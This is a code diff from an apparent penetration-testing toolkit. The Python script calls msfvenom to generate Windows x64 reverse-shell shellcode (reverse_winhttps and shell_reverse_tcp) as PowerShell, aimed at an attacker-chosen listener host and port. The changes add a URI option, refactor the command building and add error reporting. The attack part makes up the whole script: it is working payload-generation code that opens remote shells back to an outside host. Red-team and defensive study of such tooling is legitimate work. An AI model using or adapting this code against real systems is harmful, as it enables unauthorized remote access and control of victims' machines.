@@ -21,19 +21,29 @@ from meuk.hacksec import *
 parser = argparse.ArgumentParser()
 parser.add_argument("lhost", help="listener IP to use")
 parser.add_argument("lport", help="listener port to use", nargs='?', default="443")
-parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: payload/windows/x64/custom/reverse_winhttps)", nargs='?', default="payload/windows/x64/custom/reverse_winhttps")
+parser.add_argument("luri", help="uri to call", nargs='?', default="/")
+parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/custom/reverse_winhttps)", nargs='?', default="windows/x64/custom/reverse_winhttps")
 parser.add_argument("bestand", help="Warning! Dangerous.... the file to write the output to...", nargs='?', default="http/payloads/shell_443.txt")
 args = parser.parse_args()
 
 
 
 # Generate the shellcode given the preferred payload
+msf_cmd = ['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}"]
+
+#if args.luri and args.luri != "/":
+#    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} LPORT={bcolors.OKGREEN}{args.lport}{bcolors.OKBLUE} LURI={bcolors.OKGREEN}{args.luri}{bcolors.ENDC}")
+#    msf_cmd.append(f"LURI={args.luri}")
+#else:
 print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
-result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "powershell"], stdout=subprocess.PIPE)
+
+msf_cmd.extend(['exitfunc=thread', "-f", "powershell"])
+result = subprocess.run(msf_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
 if result.returncode != 0:
-    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")
+    print(f"{bcolors.BOLD}{bcolors.FAIL}[x] msfvenom stderr:{bcolors.ENDC}\n{result.stderr.decode('utf-8', errors='replace')}")
+    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful (rc={result.returncode}). Are you sure msfvenom is installed?{bcolors.ENDC}")
 
 
 
@@ -45,8 +55,16 @@ if result.returncode != 0:
 payload = result.stdout.decode("utf-8")
 
 
-print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating {bcolors.OKGREEN}payload windows/x64/reverse_tcp{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
-result = subprocess.run(['msfvenom', '-p', 'windows/x64/reverse_tcp', f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "powershell"], stdout=subprocess.PIPE)
+msf_cmd2 = ['msfvenom', '-p', 'windows/x64/shell_reverse_tcp', f"LHOST={args.lhost}", f"LPORT={args.lport}"]
+if args.luri and args.luri != "/":
+    msf_cmd2.append(f"LURI={args.luri}")
+print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating {bcolors.OKGREEN}payload windows/x64/shell_reverse_tcp{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
+msf_cmd2.extend(['exitfunc=thread', "-f", "powershell"])
+result = subprocess.run(msf_cmd2, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+if result.returncode != 0:
+    print(f"{bcolors.BOLD}{bcolors.FAIL}[x] msfvenom stderr (x64/shell_reverse_tcp):{bcolors.ENDC}\n{result.stderr.decode('utf-8', errors='replace')}")
+    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom x64/shell_reverse_tcp generation unsuccessful (rc={result.returncode}).{bcolors.ENDC}")
 
 payload2 = result.stdout.decode("utf-8")
 
